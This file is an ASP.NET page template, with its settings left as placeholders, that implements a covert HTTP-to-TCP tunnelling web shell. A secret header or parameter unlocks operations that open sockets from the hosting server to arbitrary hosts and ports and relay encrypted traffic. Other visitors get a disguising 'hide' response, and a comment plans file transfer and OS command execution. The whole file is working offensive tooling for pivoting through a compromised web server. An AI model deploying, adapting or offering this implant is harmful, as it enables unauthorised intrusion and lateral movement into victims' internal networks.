<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Collections" %>
<%@ Import Namespace="System.Collections.Generic" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<%@ Import Namespace="System.Web" %>

<script runat="server">

public class SessionConnection
{
    public string ConnectionID;
    public int PortNumber;
    public string Host;
    public Socket Sock;
    public int UnusedIterations;
    public byte[] ReceiveBuffer;
    protected static Object sessionConnectionLockObject = new Object();

	public SessionConnection()
	{
        ConnectionID = GenerateConnectionID();
        PortNumber = -1;
        Host = "";
        UnusedIterations = 0;
        ReceiveBuffer = new byte[0];
	}

    public void AddBytesToReceiveBuffer(byte[] newBytes)
    {
        if (newBytes.Length > 0)
        {
            lock (sessionConnectionLockObject)
            {
                byte[] newReceiveBuffer = new byte[ReceiveBuffer.Length + newBytes.Length];
                Array.Copy(ReceiveBuffer, 0, newReceiveBuffer, 0, ReceiveBuffer.Length);
                Array.Copy(newBytes, 0, newReceiveBuffer, ReceiveBuffer.Length, newBytes.Length);
                ReceiveBuffer = newReceiveBuffer;
            }
        }
    }

    public void InitializeSocket(bool useIPV6, string DestHost, int DestPort, int serverSocketIOTimeout, int serverSocketSendBufferSize, int serverSocketReceiveBufferSize)
    {
        if (useIPV6)
        {
            Sock = new Socket(AddressFamily.InterNetworkV6, SocketType.Stream, ProtocolType.Tcp);
        }
        else
        {
            Sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        }
        Sock.SendBufferSize = serverSocketSendBufferSize;
        Sock.SendTimeout = serverSocketIOTimeout;
        Sock.ReceiveBufferSize = serverSocketReceiveBufferSize;
        Sock.ReceiveTimeout = serverSocketIOTimeout;
        Sock.Connect(DestHost, DestPort);
    }

    public byte[] GetBytesFromReceiveBuffer(int maxBytes)
    {
        byte[] result = new byte[0];
        lock (sessionConnectionLockObject)
        {
            int byteCount = maxBytes;
            if (byteCount > ReceiveBuffer.Length)
            {
                byteCount = ReceiveBuffer.Length;
            }
            result = new byte[byteCount];

            Array.Copy(ReceiveBuffer, 0, result, 0, byteCount);

            if (byteCount == ReceiveBuffer.Length)
            {
                ReceiveBuffer = new byte[0];
            }
            else
            {
                int newByteCount = ReceiveBuffer.Length - byteCount;
                byte[] newReceiveBuffer = new byte[newByteCount];
                Array.Copy(ReceiveBuffer, byteCount, newReceiveBuffer, 0, newByteCount);
                ReceiveBuffer = newReceiveBuffer;
            }
        }
        return result;
    }

    public string GenerateConnectionID()
    {
        Random r = new Random();

        byte[] connID = new byte[8];

        r.NextBytes(connID);

        // http://stackoverflow.com/questions/311165/how-do-you-convert-byte-array-to-hexadecimal-string-and-vice-versa

        return BitConverter.ToString(connID).Replace("-","");
    }
}

/* Begin configurable options */

protected bool useIPV6ClientSocketOnServer = bool.Parse("|PLACEHOLDER_useIPV6ClientSocketOnServer|");

protected const int serverSocketMaxUnusedIterations = |PLACEHOLDER_serverSocketMaxUnusedIterations|;

protected const int serverSocketIOTimeout = |PLACEHOLDER_serverSocketIOTimeout|;
protected const int serverSocketSendBufferSize = |PLACEHOLDER_serverSocketSendBufferSize|;
protected const int serverSocketReceiveBufferSize = |PLACEHOLDER_serverSocketReceiveBufferSize|;

protected const int serverToClientBlockSize = |PLACEHOLDER_serverToClientBlockSize|;

protected const string headerValueKey = "|PLACEHOLDER_headerValueKey|";
protected const string encryptionKeyHex = "|PLACEHOLDER_encryptionKeyHex|";

protected const string headerNameKey = "|PLACEHOLDER_headerNameKey|";

protected const string accessKeyMode = "|PLACEHOLDER_accessKeyMode|";
protected const string paramNameAccessKey = "|PLACEHOLDER_paramNameAccessKey|";

protected const string paramNameOperation = "|PLACEHOLDER_paramNameOperation|";
protected const string paramNameDestinationHost = "|PLACEHOLDER_paramNameDestinationHost|";
protected const string paramNameDestinationPort = "|PLACEHOLDER_paramNameDestinationPort|";
protected const string paramNameConnectionID = "|PLACEHOLDER_paramNameConnectionID|";
protected const string paramNameData = "|PLACEHOLDER_paramNameData|";
protected const string paramNamePlaintextBlock = "|PLACEHOLDER_paramNamePlaintextBlock|";
protected const string paramNameEncryptedBlock = "|PLACEHOLDER_paramNameEncryptedBlock|";

protected const string dataBlockNameValueSeparatorB64 = "|PLACEHOLDER_dataBlockNameValueSeparatorB64|";
protected const string dataBlockParamSeparatorB64 = "|PLACEHOLDER_dataBlockParamSeparatorB64|";

protected const string opModeStringOpenConnection = "|PLACEHOLDER_opModeStringOpenConnection|";
protected const string opModeStringSendReceive = "|PLACEHOLDER_opModeStringSendReceive|";
protected const string opModeStringCloseConnection = "|PLACEHOLDER_opModeStringCloseConnection|";

protected const string responseStringHide = "|PLACEHOLDER_responseStringHide|";
protected const string responseStringConnectionCreated = "|PLACEHOLDER_responseStringConnectionCreated|";
protected const string responseStringConnectionClosed = "|PLACEHOLDER_responseStringConnectionClosed|";
protected const string responseStringData = "|PLACEHOLDER_responseStringData|";
protected const string responseStringNoData = "|PLACEHOLDER_responseStringNoData|";
protected const string responseStringErrorGeneric = "|PLACEHOLDER_responseStringErrorGeneric|";
protected const string responseStringErrorInvalidRequest = "|PLACEHOLDER_responseStringErrorInvalidRequest|";
protected const string responseStringErrorConnectionNotFound = "|PLACEHOLDER_responseStringErrorConnectionNotFound|";
protected const string responseStringErrorConnectionOpenFailed = "|PLACEHOLDER_responseStringErrorConnectionOpenFailed|";
protected const string responseStringErrorConnectionCloseFailed = "|PLACEHOLDER_responseStringErrorConnectionCloseFailed|";
protected const string responseStringErrorConnectionSendFailed = "|PLACEHOLDER_responseStringErrorConnectionSendFailed|";
protected const string responseStringErrorConnectionReceiveFailed = "|PLACEHOLDER_responseStringErrorConnectionReceiveFailed|";
protected const string responseStringErrorDecryptFailed = "|PLACEHOLDER_responseStringErrorDecryptFailed|";
protected const string responseStringErrorEncryptFailed = "|PLACEHOLDER_responseStringErrorEncryptFailed|";
protected const string responseStringErrorEncryptionNotSupported = "|PLACEHOLDER_responseStringErrorEncryptionNotSupported|";
protected const string responseStringPrefixB64 = "|PLACEHOLDER_responseStringPrefixB64|";
protected const string responseStringSuffixB64 = "|PLACEHOLDER_responseStringSuffixB64|";

/* End configurable options */

protected string responseStringPrefix = System.Text.Encoding.ASCII.GetString(Convert.FromBase64String(responseStringPrefixB64));
protected string responseStringSuffix = System.Text.Encoding.ASCII.GetString(Convert.FromBase64String(responseStringSuffixB64));

protected string dataBlockNameValueSeparator = System.Text.Encoding.ASCII.GetString(Convert.FromBase64String(dataBlockNameValueSeparatorB64));
protected string dataBlockParamSeparator = System.Text.Encoding.ASCII.GetString(Convert.FromBase64String(dataBlockParamSeparatorB64));

protected const int OPMODE_HIDE = 0;
protected const int OPMODE_DEFAULT = 1;
protected const int OPMODE_OPEN = 2;
protected const int OPMODE_SEND_RECEIVE = 4;
protected const int OPMODE_CLOSE = 8;
/* To do: file upload/download, OS command execution */
protected const int OPMODE_UPLOAD = 16;
protected const int OPMODE_DOWNLOAD = 32;
protected const int OPMODE_CMD_EXEC = 64;

protected const int encryptionBlockSize = 16;

protected static Object pageLockObject = new Object();

protected void Page_Load(object sender, EventArgs e)
{
    int opMode = OPMODE_HIDE;

    byte[] encryptionKey = new byte[] {};

    try
    {
	    encryptionKey = hexStringToByteArray(encryptionKeyHex);
    }
    catch (Exception ex)
    {
	    encryptionKey = new byte[] {};
    }

    try
    {
		if (accessKeyMode == "header")
		{
			if ((Request.Headers[headerNameKey] != null) && (Request.Headers[headerNameKey].Trim() == headerValueKey.Trim()))
			{
				opMode = OPMODE_DEFAULT;
			}
		}
		else
		{
			if ((Request.Params[paramNameAccessKey] != null) && (Request.Params[paramNameAccessKey].Trim() == headerValueKey.Trim()))
			{
				opMode = OPMODE_DEFAULT;
			}
		}
    }
    catch (Exception ex)
    {
        opMode = OPMODE_HIDE;
    }

    Response.Write(responseStringPrefix);

    if (opMode == OPMODE_HIDE)
    {
	    Response.Write(responseStringHide);
    }

    if (opMode != OPMODE_HIDE)
    {
	    int DestPort = -1;
	    String RequestedOp = "";
	    String DestHost = "";
	    String DataB64 = "";
	    String ConnectionID = "";
	    Hashtable Connections = new Hashtable();
	    SessionConnection Conn = new SessionConnection();
	    bool encryptedRequest = false;
	    String unpackedBlock = "";
	    Hashtable unpackedParams = new Hashtable();
	    bool sentResponse = false;
	
	    bool validRequest = true;
	
	    try
	    {
		    if ((Request.Params[paramNameEncryptedBlock] != null) || (Request.Params[paramNamePlaintextBlock] != null))
		    {
			    byte[] decodedBytes = new byte[0];
			    if ((Request.Params[paramNameEncryptedBlock] != null) && (encryptionKey.Length > 0))
			    {
				    decodedBytes = Convert.FromBase64String(Request.Params[paramNameEncryptedBlock]);
				    try
				    {
					    byte[] decryptedBytes = DecryptData(decodedBytes, encryptionKey);
                        unpackedBlock = System.Text.Encoding.UTF8.GetString(decryptedBytes);
                        encryptedRequest = true;
				    }
				    catch (Exception ex)
				    {
                        Response.Write(responseStringErrorDecryptFailed);
					    /* return; */
					    validRequest = false;
					    sentResponse = true;
				    }
			    }
			    else
			    {
				    decodedBytes = Convert.FromBase64String(Request.Params[paramNamePlaintextBlock]);
				    unpackedBlock = System.Text.Encoding.UTF8.GetString(decodedBytes);
			    }
			
			    if (validRequest)
			    {
				    String[] paramArray = unpackedBlock.Split(new string[] { dataBlockParamSeparator }, StringSplitOptions.None);
				    if (paramArray.Length > 0)
				    {
					    for (int i = 0; i < paramArray.Length; i++)
					    {
						    String currentParam = paramArray[i];
						    String[] pvArray = currentParam.Split(new string[] { dataBlockNameValueSeparator }, StringSplitOptions.None);
						    if (pvArray.Length > 1)
						    {
							    unpackedParams.Add(pvArray[0], pvArray[1]);
						    }
					    }
				    }
			    }
		    }
	    }
	    catch (Exception ex)
	    {
		    validRequest = false;
	    }
	
	    if (validRequest)
	    {		
		    try
		    {
			    if (unpackedParams.ContainsKey(paramNameOperation))
			    {
				    RequestedOp = (String)unpackedParams[paramNameOperation];
			    }
		    }
		    catch (Exception ex)
		    {
			    RequestedOp = "";
		    }
		
		    try
		    {
			    if (unpackedParams.ContainsKey(paramNameDestinationHost))
			    {
				    DestHost = (String)unpackedParams[paramNameDestinationHost];
			    }
		    }
		    catch (Exception ex)
		    {
			    DestHost = "";
		    }

		    try
		    {
			    if (unpackedParams.ContainsKey(paramNameConnectionID))
			    {
				    ConnectionID = (String)unpackedParams[paramNameConnectionID];
			    }
		    }
		    catch (Exception ex)
		    {
			    ConnectionID = "";
		    }
		
		    try
		    {
			    if (unpackedParams.ContainsKey(paramNameDestinationPort))
			    {
				    DestPort = int.Parse((String)unpackedParams[paramNameDestinationPort]);
			    }
		    }
		    catch (Exception ex)
		    {
			    DestPort = -1;
		    }
		
		    try
		    {
			    if (unpackedParams.ContainsKey(paramNameData))
			    {
				    DataB64 = (String)unpackedParams[paramNameData];
			    }
		    }
		    catch (Exception ex)
		    {
			    DataB64 = "";
		    }
		
		    if (RequestedOp == "")
		    {
			    validRequest = false;
		    }
	    }
	
	    if (validRequest)
	    {
		    if (RequestedOp == opModeStringOpenConnection)
		    {
			    opMode = OPMODE_OPEN;
			    if (DestHost == "")
			    {
				    validRequest = false;
			    }
			    if (DestPort == -1)
			    {
				    validRequest = false;
			    }
		    }
		    if (RequestedOp == opModeStringSendReceive)
		    {
			    opMode = OPMODE_SEND_RECEIVE;
                if (ConnectionID == "")
                {
                    validRequest = false;
                }
		    }
		    if (RequestedOp == opModeStringCloseConnection)
		    {
			    opMode = OPMODE_CLOSE;
			    if (ConnectionID == "")
			    {
				    validRequest = false;
			    }
		    }
	    }
	
	    if (!validRequest)
	    {
		    if (!sentResponse)
		    {
			    Response.Write(responseStringErrorInvalidRequest);
                // might need to backport this to the JSP version
                sentResponse = true;
			    /* return; */
		    }
	    }
	    else
	    {
		    try
		    {
			    Connections = (Hashtable)Session["SessionConnections"];
			    if (Connections == null)
			    {
				    Connections = new Hashtable();
			    }
		    }
		    catch (Exception ex)
		    {
			    Connections = new Hashtable();
		    }
		
		    if (opMode == OPMODE_OPEN)
		    {
			    Conn = new SessionConnection();
			    Conn.Host = DestHost;
			    Conn.PortNumber = DestPort;
			    ConnectionID = Conn.ConnectionID;
			    try
			    {
                    Conn.InitializeSocket(useIPV6ClientSocketOnServer, DestHost, DestPort, serverSocketIOTimeout, serverSocketSendBufferSize, serverSocketReceiveBufferSize);
				    Connections.Add(ConnectionID, Conn);
                    Response.Write(responseStringConnectionCreated + " " + ConnectionID);
				    sentResponse = true;
			    }
			    catch (Exception ex)
			    {
				    Response.Write(responseStringErrorConnectionOpenFailed);
				    /* return; */
				    validRequest = false;
				    sentResponse = true;
			    }
		    }
	    }
	
	    if ((validRequest) && (opMode == OPMODE_SEND_RECEIVE) || (opMode == OPMODE_CLOSE))
	    {
		    if (Connections.ContainsKey(ConnectionID))
		    {
			    try
			    {
				    Conn = (SessionConnection)Connections[ConnectionID];
				    if (Conn.Sock == null)
				    {
					    validRequest = false;
					    Connections.Remove(ConnectionID);
				    }
			    }
			    catch (Exception ex)
			    {
				    validRequest = false;
			    }
		    }
		    else
		    {
			    validRequest = false;
		    }
		
		    if (!validRequest)
		    {
			    if (!sentResponse)
			    {
				    Response.Write(responseStringErrorConnectionNotFound);
				    /* return; */
				    validRequest = false;
				    sentResponse = true;
			    }
		    }
	    }

	    if ((validRequest) && (opMode == OPMODE_SEND_RECEIVE))
	    {
            if (Conn != null)
            {
                if (!Conn.Sock.Connected)
                {
                    DestHost = Conn.Host;
                    DestPort = Conn.PortNumber;
                    Conn.InitializeSocket(useIPV6ClientSocketOnServer, DestHost, DestPort, serverSocketIOTimeout, serverSocketSendBufferSize, serverSocketReceiveBufferSize);
                }
            }

		    byte[] bytesOut = Convert.FromBase64String(DataB64);
		
		    bool socketStillOpen = true;
		
		    try
		    {
                Conn.Sock.Send(bytesOut);
		    }
		    catch (Exception ex)
		    {
			    socketStillOpen = false;
			    opMode = OPMODE_CLOSE;
		    }

		    byte[] bytesIn = new byte[0];

            if (socketStillOpen)
            {
                byte[] buf = new byte[6553600];
                int maxReadAttempts = 65536000;
                maxReadAttempts = 200;
                int readAttempts = 0;
                int nRead = 0;
                bool doneReading = false;
                try
                {
                    if (Conn.Sock.Poll(serverSocketIOTimeout * 100, SelectMode.SelectRead))
                    {
                        nRead = Conn.Sock.Receive(buf);
                    }
                    else
                    {
                        nRead = -1;
                    }
                    if (nRead < 0)
                    {
                        doneReading = true;
                    }
                }
                catch (Exception ex)
                {
                    doneReading = true;
                }
                while (!doneReading)
                {
                    if (nRead > 0)
                    {
                        byte[] newBytesIn = new byte[bytesIn.Length + nRead];
                        if (bytesIn.Length > 0)
                        {
                            Array.Copy(bytesIn, 0, newBytesIn, 0, bytesIn.Length);
                        }
                        Array.Copy(buf, 0, newBytesIn, bytesIn.Length, nRead);
                        bytesIn = newBytesIn;
                    }

                    try
                    {
                        if (Conn.Sock.Poll(serverSocketIOTimeout, SelectMode.SelectRead))
                        {
                            nRead = Conn.Sock.Receive(buf);
                        }
                        else
                        {
                            if (Conn.Sock.Connected)
                            {
                                nRead = 0;
                            }
                            else
                            {
                                nRead = -1;
                            }
                        }
                        if (nRead < 0)
                        {
                            doneReading = true;
                        }
                    }
                    catch (Exception ex)
                    {
                        doneReading = true;
                    }
                    readAttempts++;
                    if (readAttempts > maxReadAttempts)
                    {
                        doneReading = true;
                    }
                }

                // might need to backport this to JSP
                lock (pageLockObject)
                {
                    Conn.AddBytesToReceiveBuffer(bytesIn);
                }
            }
		
		    if (Conn.ReceiveBuffer.Length > 0)
		    {
			    String OutB64 = "";
                // might need to backport this to JSP
                byte[] toClient = new byte[0];
                lock (pageLockObject)
                {
                    toClient = Conn.GetBytesFromReceiveBuffer(serverToClientBlockSize);
                }
			    if (encryptedRequest)
			    {
				    try
				    {
					    byte[] encryptedBytes = EncryptData(toClient, encryptionKey);
					    OutB64 = Convert.ToBase64String(encryptedBytes);
				    }
				    catch (Exception ex)
				    {
					    Response.Write(responseStringErrorEncryptFailed);
					    validRequest = false;
					    sentResponse = true;
				    }
			    }
			    else
			    {
				    OutB64 = Convert.ToBase64String(toClient);
			    }
			    if (!sentResponse)
			    {
                    Response.Write(responseStringData + " " + OutB64);
				    sentResponse = true;
			    }
		    }
		    else
		    {
			    if (!sentResponse)
			    {
                    Response.Write(responseStringNoData);
				    sentResponse = true;
			    }
		    }
	    }
	
	    if ((validRequest) && (opMode == OPMODE_CLOSE))
	    {
		    try
		    {
			    Conn.Sock.Close();
			    if (!sentResponse)
			    {
                    Response.Write(responseStringConnectionClosed + " " + ConnectionID);
				    sentResponse = true;
			    }
		    }
		    catch (Exception ex)
		    {
			    if (!sentResponse)
			    {
				    Response.Write(responseStringErrorConnectionCloseFailed);
				    sentResponse = true;
			    }
		    }
	    }
	
	    if (validRequest)
	    {	
		    lock(pageLockObject)
		    {
			    try
			    {
				    Connections = (Hashtable)Session["SessionConnections"];
				    if (Connections == null)
				    {
					    Connections = new Hashtable();
				    }
			    }
			    catch (Exception ex)
			    {
				    Connections = new Hashtable();
			    }
			
			    /* Update the current connection (if one exists), and remove stale connections */
			
			    if (ConnectionID != "")
			    {
				    Conn.UnusedIterations = 0;
				    if (Connections.ContainsKey(ConnectionID))
				    {
					    Connections.Remove(ConnectionID);
					    if (opMode != OPMODE_CLOSE)
					    {
                            if (Conn.Sock.Connected)
                            {
                                Connections.Add(ConnectionID, Conn);
                            }
					    }
				    }
				    else
				    {
					    Connections.Add(ConnectionID, Conn);
				    }
			    }
			
			    foreach (string cid in Connections.Keys)
			    {
				    if (cid != ConnectionID)
				    {
					    SessionConnection c = (SessionConnection)Connections[cid];
					    Connections.Remove(cid);
					    c.UnusedIterations++;
					    if (c.UnusedIterations < serverSocketMaxUnusedIterations)
					    {
						    Connections.Add(cid, c);
					    }
					    else
					    {
						    try
						    {
							    c.Sock.Close();
						    }
						    catch (Exception ex)
						    {
							    // do nothing
						    }
					    }
				    }
			    }
			
			    Session["SessionConnections"] = Connections;
		    }
	    }
    }

    Response.Write(responseStringSuffix);

}

// http://stackoverflow.com/questions/311165/how-do-you-convert-byte-array-to-hexadecimal-string-and-vice-versa
public byte[] hexStringToByteArray(string hex)
{
    int NumberChars = hex.Length;
    byte[] bytes = new byte[NumberChars / 2];
    for (int i = 0; i < NumberChars; i += 2)
    {
        bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
    }
    return bytes;
}

public byte[] EncryptData(byte[] plaintext, byte[] key)
{
	int ivSize = 12;
	int tagSize = 16;
    byte[] data = new byte[ivSize + plaintext.Length + tagSize];

	using (AesGcm cipher = new AesGcm(key, tagSize))
	{
		byte[] nonce = new byte[ivSize];
      	RandomNumberGenerator.Fill(nonce);
		System.Buffer.BlockCopy(nonce, 0, data, 0, ivSize);

		byte[] tag = new byte[tagSize];
		byte[] ciphertext = new byte[plaintext.Length];
		cipher.Encrypt(nonce, plaintext, ciphertext, tag, null);
		System.Buffer.BlockCopy(ciphertext, 0, data, ivSize, ciphertext.Length);
		System.Buffer.BlockCopy(tag, 0, data, ciphertext.Length + ivSize, tagSize);
	}

	return data;
}

public byte[] DecryptData(byte[] ciphertext, byte[] key)
{
	int ivSize = 12;
	int tagSize = 16;
    byte[] plaintext = new byte[ciphertext.Length - ivSize - tagSize];

    using (AesGcm cipher = new AesGcm(key, tagSize))
    {
        byte[] nonce = new byte[ivSize];
        System.Buffer.BlockCopy(ciphertext, 0, nonce, 0, ivSize);

        byte[] data = new byte[ciphertext.Length - ivSize - tagSize];
        System.Buffer.BlockCopy(ciphertext, ivSize, data, 0, ciphertext.Length - ivSize - tagSize);

        byte[] tag = new byte[tagSize];
        System.Buffer.BlockCopy(ciphertext, ciphertext.Length - tagSize, tag, 0, tagSize);

        cipher.Decrypt(nonce, data, tag, plaintext);
    }

    return plaintext;
}

// http://stackoverflow.com/questions/8613187/an-elegant-way-to-consume-all-bytes-of-a-binaryreader
public byte[] ReadAllBytes(BinaryReader reader)
{
    const int bufferSize = 4096;
    using (MemoryStream ms = new MemoryStream())
    {
        byte[] buffer = new byte[bufferSize];
        int count;
        while ((count = reader.Read(buffer, 0, buffer.Length)) != 0)
        {
            ms.Write(buffer, 0, count);
        }
        return ms.ToArray();
    }

}

</script>
